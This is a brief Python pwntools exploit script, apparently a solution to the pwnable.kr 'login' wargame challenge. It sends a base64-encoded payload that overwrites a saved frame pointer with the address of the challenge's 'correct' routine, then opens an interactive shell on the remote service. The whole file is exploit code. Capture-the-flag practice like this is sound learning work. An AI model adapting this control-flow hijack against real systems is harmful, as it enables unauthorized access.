from pwn import * 
from base64 import b64encode 

#sh = process("./login") 
sh = remote("pwnable.kr",9003)
correct = p32(0x0804925F) 
input_addr = p32(0x0811EB40 )  
inp = p32(0xDEADBEEF) +  correct + input_addr 
print sh.recv() 
#raw_input("DEBUG")
sh.sendline(b64encode(inp)) 
print sh.recv()
sh.interactive()
